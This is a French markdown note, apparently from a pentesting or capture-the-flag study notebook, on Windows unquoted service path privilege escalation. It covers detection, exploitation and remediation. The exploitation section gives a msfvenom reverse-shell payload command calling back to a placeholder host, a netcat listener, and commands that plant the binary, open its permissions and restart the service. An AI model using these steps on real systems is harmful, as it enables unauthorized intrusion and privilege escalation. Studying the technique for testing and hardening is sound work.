---
technique: "Unquoted Service Path"
os: Windows
categorie: PrivEsc
tags: [technique, privesc, windows, services]
rooms: []
---

# Unquoted Service Path

## Principe
> Quand le `BINARY_PATH_NAME` d'un service contient des **espaces** et n'est **pas entre guillemets**, le SCM teste plusieurs interprétations. En déposant un exécutable à un emplacement prioritaire **writable**, on force le service à lancer notre binaire.

## Exemple
Chemin : `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` (non quoté)
Le SCM essaie dans l'ordre :
1. `C:\MyPrograms\Disk.exe` ← **cible si writable**
2. `C:\MyPrograms\Disk Sorter.exe`
3. `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` (le vrai)

## Détection
```cmd
sc qc <service>                 :: BINARY_PATH_NAME sans guillemets + espaces ?
icacls C:\MyPrograms            :: dossier writable ? (droits AD / WD pour Users)
```
> Normalement bloqué sous `C:\Program Files` (non writable). Exploitable si install dans un chemin non-standard world-writable, ou si l'installeur a changé les permissions.

## Exploitation
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=MON_IP LPORT=4446 -f exe-service -o rev-svc2.exe
nc -lvp 4446
```
```cmd
move rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```
→ shell avec les privilèges du compte du service (svcusr2).

## Remédiation
- Toujours mettre le `BINARY_PATH_NAME` entre guillemets ; installer sous `C:\Program Files`.
